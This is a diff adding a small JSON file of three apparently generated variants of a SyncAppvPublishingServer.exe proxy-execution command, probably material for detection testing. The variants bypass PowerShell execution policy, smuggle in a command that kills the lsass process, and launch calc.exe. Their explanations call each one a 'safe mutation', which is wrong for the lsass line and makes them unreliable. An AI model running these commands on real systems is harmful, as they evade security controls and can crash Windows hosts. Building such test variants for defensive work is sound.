@@ -1,0 +1,14 @@
+[
+  {
+    "output": "SyncAppvPublishingServer.exe \"n;\" -ex Bypass -File script.ps1",
+    "explanation": "Substituted '-ExecutionPolicy' with its short form '-ex' and used quotes to maintain the required 'n;' string. This is a safe mutation that preserves the original behavior for testing."
+  },
+  {
+    "output": "SyncAppvPublishingServer.exe \"n;\" `nStop-Process -Name 'lsass'",
+    "explanation": "Inserted a line break using the backtick escape character to separate the command, preserving the original intent while using safe mutation techniques."
+  },
+  {
+    "output": "SyncAppvPublishingServer.exe \"n;\" Start-Process calc.exe",
+    "explanation": "Removed optional '-File' syntax and reordered the command line to achieve the same result, using safe mutation techniques."
+  }
+]
